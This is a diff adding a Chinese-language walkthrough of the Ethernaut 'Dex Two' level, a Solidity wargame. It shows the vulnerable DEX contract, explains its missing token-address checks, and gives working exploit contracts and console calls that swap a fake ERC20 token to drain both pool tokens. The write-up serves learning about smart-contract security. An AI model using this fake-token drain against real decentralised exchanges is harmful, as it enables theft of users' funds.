@@ -1739,3 +1739,105 @@ contract SwappableToken is ERC20 {
     ```
 
 - 不应从单个来源获取价格或其它数据，可以借助于 Oracles，如 [Chainlink Data Feeds](https://docs.chain.link/docs/get-the-latest-price)
+
+## 23. Dex Two
+
+- 清空 `DexTwo` 合约中的所有代币
+- 合约 `DexTwo` 每种代币初始各 100 枚，玩家每种代币初始各 10 枚
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
+import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
+import 'openzeppelin-contracts-08/access/Ownable.sol';
+
+contract DexTwo is Ownable {
+  address public token1;
+  address public token2;
+  constructor() {}
+
+  function setTokens(address _token1, address _token2) public onlyOwner {
+    token1 = _token1;
+    token2 = _token2;
+  }
+
+  function add_liquidity(address token_address, uint amount) public onlyOwner {
+    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+  }
+  
+  function swap(address from, address to, uint amount) public {
+    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+    uint swapAmount = getSwapAmount(from, to, amount);
+    IERC20(from).transferFrom(msg.sender, address(this), amount);
+    IERC20(to).approve(address(this), swapAmount);
+    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
+  } 
+
+  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
+    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
+  }
+
+  function approve(address spender, uint amount) public {
+    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
+    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
+  }
+
+  function balanceOf(address token, address account) public view returns (uint){
+    return IERC20(token).balanceOf(account);
+  }
+}
+
+contract SwappableTokenTwo is ERC20 {
+  address private _dex;
+  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
+        _mint(msg.sender, initialSupply);
+        _dex = dexInstance;
+  }
+
+  function approve(address owner, address spender, uint256 amount) public {
+    require(owner != _dex, "InvalidApprover");
+    super._approve(owner, spender, amount);
+  }
+}
+```
+
+- 相比合约 `Dex`，合约 `DexTwo` 在进行货币交换时不再检查输入参数 `from`、`to`，因此可以借助其它代币来清空 `DexTwo` 中的 `token1` 和 `token2`
+
+    ```js
+    contract Hack {
+      address[] tokens;
+      function exploit(address instance) public {
+        DexTwo dex = DexTwo(instance);
+        tokens.push(dex.token1());
+        tokens.push(dex.token2());
+        for (uint8 i = 0; i < 2; i ++) {
+          SwappableTokenTwo token = new SwappableTokenTwo(instance, "fake", "F", 2);
+          token.transfer(instance, 1);
+          token.approve(address(this), instance, 1);
+          dex.swap(address(token), tokens[i], 1);
+        }
+      }
+    }
+    ```
+  
+- 声明实现了 ERC20 标准的合约不一定可信，部分合约的[函数返回值可能缺失](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca)，也可能存在恶意行为
+- 更简单地，可以部署一个恶意的 ERC20 合约
+
+    ```js
+    contract DexTwoAttackToken {
+        function balanceOf(address) external pure returns (uint256) {
+            return 1;
+        }
+
+        function transferFrom(address, address, uint256) external pure returns (bool) {
+            return true;
+        }
+    }
+    ```
+
+    ```js
+    >> contract.swap("<DexTwoAttackTokenAddress>", await contract.token1(), 1)
+    >> contract.swap("<DexTwoAttackTokenAddress>", await contract.token2(), 1)
+    ```
